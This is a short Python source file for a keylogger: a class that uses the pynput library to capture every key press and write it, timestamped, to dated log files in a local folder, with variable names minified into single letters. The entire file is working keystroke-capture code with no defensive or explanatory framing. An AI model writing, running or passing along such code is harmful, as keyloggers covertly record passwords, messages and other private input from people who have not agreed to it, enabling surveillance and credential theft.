from pynput.keyboard import Key, Listener
import logging, os
from datetime import datetime


class Keylogger:
    def create_log_directory(B):
        A = "log"
        C = os.getcwd()
        B.log_dir = os.path.join(C, A)
        if not os.path.exists(A):
            os.mkdir(A)

    @staticmethod
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as A:
            logging.info(A)

    def write_log_file(A):
        B = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
        logging.basicConfig(
            filename=os.path.join(A.log_dir, B) + "-log.txt",
            level=logging.DEBUG,
            format="[%(asctime)s]: %(message)s",
        )
        with Listener(on_press=A.on_press) as C:
            C.join()


if __name__ == "__main__":
    klog = Keylogger()
    klog.create_log_directory()
    klog.write_log_file()
